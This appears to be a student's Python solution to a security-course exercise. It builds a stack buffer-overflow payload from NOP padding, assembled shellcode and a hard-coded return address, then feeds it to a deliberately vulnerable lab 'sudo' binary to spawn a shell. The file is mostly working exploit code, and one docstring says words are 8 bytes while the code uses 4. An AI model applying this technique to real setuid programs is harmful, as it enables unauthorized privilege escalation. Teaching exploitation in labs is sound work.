import os
import sys
from infosec.core import assemble

def assemble_by_words(data: bytes):
    """Given some bytes string, this will divide this data into words (8 bytes each),
    and will return an array of those words."""
    arr=[]
    for i in range(0,len(data),4):
        arr.append(data[i:i+4])
    return arr
    
def run_shell(path_to_sudo: str):
    """
    Exploit the vulnerable sudo program to open an interactive shell.

    The assembly code of the shellcode should be saved in `shellcode.asm`, use
    the `assemble` module to translate the assembly to bytes.

    WARNINGS:
    1. As before, use `path_to_sudo` and don't hard-code the path.
    2. If you reference any external file, it must be *relative* to the current
       directory! For example './shellcode.asm' is OK, but
       '/home/user/3/q2/shellcode.asm' is bad because it's an absolute path!

    Tips:
    1. For help with the `assemble` module, run the following command (in the
       command line).
           ipython3 -c 'from infosec.core import assemble; help(assemble)'
    2. As before, prefer using `os.execl` over `os.system`.

    :param path_to_sudo: The path to the vulnerable sudo program.
    """
    #X is the adress want to jump to, written in little indian (we will put this value in the return adress)
    X = b'\xc9\xdf\xff\xbf'
    #this is the adress of the return adress. we want to put x in this adress so we could jump to our code.
    val_to_update = 0xbfffe00c
    # this is the number of words between the val we want to update to x. meaning this is the number of words in the memory that are between X and the adress we want to change. 
    Y=18
    # an array of 18 words- all nops (this is for padding. out exploit code in words is smaller then 18)
    bar =[b'\x90\x90\x90\x90' for i in range(0,Y)]
    # a piece of an aseembly code that opens a shell- written in hex. 
    shellcode=assemble.assemble_file("./shellcode.asm")
    # arr will be an array of words of the hex shell code
    arr= assemble_by_words(shellcode)
    i=0
    #this will change the bar array and put our code in the right places.
    for word in arr:
        bar[i]=word
        i+=1
    # the last cell of the array will be the adress we want to jump to.
    bar[-1]=X
    # convet the words array into bytes
    exploit=b''.join(bar)
    # some command. irrelevnt to the attack. just to get a "valid" input to the sudo program.
    cmd= "echo meaw"
    # run the sudo program with our attack as input, and the command 
    os.execl(path_to_sudo, path_to_sudo, exploit, cmd)

def main(argv):
    # WARNING: Avoid changing this function.
    if not len(argv) == 1:
        print('Usage: %s' % argv[0])
        sys.exit(1)

    run_shell(path_to_sudo='./sudo')


if __name__ == '__main__':
    main(sys.argv)
